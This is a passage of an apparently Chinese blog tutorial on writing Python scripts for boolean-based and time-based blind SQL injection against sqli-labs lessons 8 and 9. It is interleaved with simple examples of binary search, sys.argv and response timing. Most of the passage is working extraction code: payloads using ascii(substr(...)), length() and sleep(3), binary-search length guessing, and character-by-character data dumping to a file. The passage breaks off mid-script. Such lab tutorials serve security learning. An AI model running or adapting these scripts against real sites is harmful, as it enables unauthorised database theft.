    result<span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">True</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> <span class="token boolean">False</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">)</span>
                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                    exit<span class="token punctuation">(</span><span class="token string">"网络请求错误，程序退出."</span><span class="token punctuation">)</span>

                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    flag <span class="token operator">=</span> <span class="token boolean">True</span>
                    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">&#125;</span></span><span class="token string">,脚本运行结束"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">return</span> result
get_info<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 从 0~99 中用二分法查找一个数需要几次？</span>
nums <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">def</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 左右都闭合的区间 [l, r]</span>
    l<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
    <span class="token keyword">global</span> s
    <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> r<span class="token punctuation">:</span>
        s <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token comment"># l+r的值右移1位，相当l+r的值除以2向下取整</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">:</span> <span class="token keyword">return</span> mid
        <span class="token comment"># 解空间变为 [mid+1, right]</span>
        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> target<span class="token punctuation">:</span> l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token comment"># 解空间变为 [left, mid - 1]</span>
        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">:</span> r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>binarySearch<span class="token punctuation">(</span>nums<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"执行了</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">次循环~!"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="sqli-less8二分法查找长度"><a href="#sqli-less8二分法查找长度" class="headerlink" title="sqli-less8二分法查找长度"></a>sqli-less8二分法查找长度</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token comment"># sql = "select group_concat(schema_name) from information_schema.schemata"</span>
<span class="token comment"># 计算sql语句查询值长度</span>
<span class="token keyword">def</span> <span class="token function">get_len</span><span class="token punctuation">(</span>sql<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>l<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 左右都闭合的区间 [l, r]</span>
    <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> r<span class="token punctuation">:</span>
        <span class="token comment"># l+r的值右移1位，相当l+r的值除以2向下取整</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment"># 如果页面正常，说明猜解正确 返回mid</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> mid
        <span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>
    <span class="token keyword">return</span> get_len<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">10</span> <span class="token operator">*</span> r<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>get_len<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="sys-argv参数传递"><a href="#sys-argv参数传递" class="headerlink" title="sys.argv参数传递"></a>sys.argv参数传递</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
list_of_arguments <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv
<span class="token keyword">print</span><span class="token punctuation">(</span>list_of_arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>list_of_arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>list_of_arguments<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>list_of_arguments<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># python test.py 111 "222" "abc"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="os-path文件路径"><a href="#os-path文件路径" class="headerlink" title="os.path文件路径"></a>os.path文件路径</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token comment"># 当前文件绝对路径</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 当前文件所在目录</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="sqli-less8盲注脚本编写3"><a href="#sqli-less8盲注脚本编写3" class="headerlink" title="sqli-less8盲注脚本编写3"></a>sqli-less8盲注脚本编写3</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys<span class="token punctuation">,</span>os
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result<span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">True</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> <span class="token boolean">False</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                    exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取数据内容,程序退出 中断于第 &#123;i&#125; 个字符."</span><span class="token punctuation">)</span>
                    
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    flag <span class="token operator">=</span> <span class="token boolean">True</span>
                    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">&#125;</span></span><span class="token string">,脚本运行结束"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"less8-data.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"# </span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string"> : "</span></span> <span class="token operator">+</span> result <span class="token operator">+</span>
<span class="token string">"\n"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result
<span class="token comment"># 计算sql语句查询值长度</span>
<span class="token keyword">def</span> <span class="token function">get_len</span><span class="token punctuation">(</span>sql<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>l<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 左右都闭合的区间 [l, r]</span>
    <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> r<span class="token punctuation">:</span>
        <span class="token comment"># l+r的值右移1位，相当l+r的值除以2向下取整</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment"># 如果页面正常，说明猜解正确 返回mid</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取sql查询结果长度,程序退出."</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> mid
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取sql查询结果长度,程序退出."</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>
    <span class="token keyword">return</span> get_len<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">10</span> <span class="token operator">*</span> r<span class="token punctuation">)</span>
<span class="token comment"># python 入口函数</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    list_of_arguments <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv
    sql <span class="token operator">=</span> list_of_arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    length <span class="token operator">=</span> get_len<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>length<span class="token punctuation">&#125;</span></span><span class="token string"> , 开始获取内容"</span></span><span class="token punctuation">)</span>
    get_info<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> length<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"运行完毕, 请打开文件查看: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\\less8-data.txt"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="延时注入脚本编写"><a href="#延时注入脚本编写" class="headerlink" title="延时注入脚本编写"></a>延时注入脚本编写</h3><p>延时注入通过，requests包从发出到响应的时间来判断sql语句是否成功执行即可</p>
<p>requests请求响应时间 res.elapsed 中记录了 requests 请求的响应时间</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span><span class="token punctuation">)</span>
<span class="token comment"># 时:分:秒</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">)</span>
<span class="token comment"># 秒数</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 微秒数</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>microseconds<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>简单测试模型</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
sql <span class="token operator">=</span> <span class="token string">"select database()"</span>
res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-9/?id=1' and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">,1))=115, sleep(3),1) -- +"</span></span><span class="token punctuation">)</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>脚本编写</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys<span class="token punctuation">,</span>os
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result<span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">True</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> <span class="token boolean">False</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    <span class="token comment"># 延时判断时间根据实际网络情况更改 sleep(3)</span>
                    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-9/?id=1' and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(3),1) -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                    exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取数据内容,程序退出 中断于第 &#123;i&#125; 个字符."</span><span class="token punctuation">)</span>
                    
                <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    flag <span class="token operator">=</span> <span class="token boolean">True</span>
                    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">&#125;</span></span><span class="token string">,脚本运行结束"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"less9-data.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"# </span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string"> : "</span></span> <span class="token operator">+</span> result <span class="token operator">+</span>
<span class="token string">"\n"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result
<span class="token comment"># 计算sql语句查询值长度</span>
<span class="token keyword">def</span> <span class="token function">get_len</span><span class="token punctuation">(</span>sql<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>l<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 左右都闭合的区间 [l, r]</span>
    <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> r<span class="token punctuation">:</span>
        <span class="token comment"># l+r的值右移1位，相当l+r的值除以2向下取整</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment"># 如果页面正常，说明猜解正确 返回mid</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-9/?id=1' and if(length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(3),1) -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取sql查询结果长度,程序退出."</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> mid
        <span class="token keyword">try</span><span class="token punctuation">:</span>
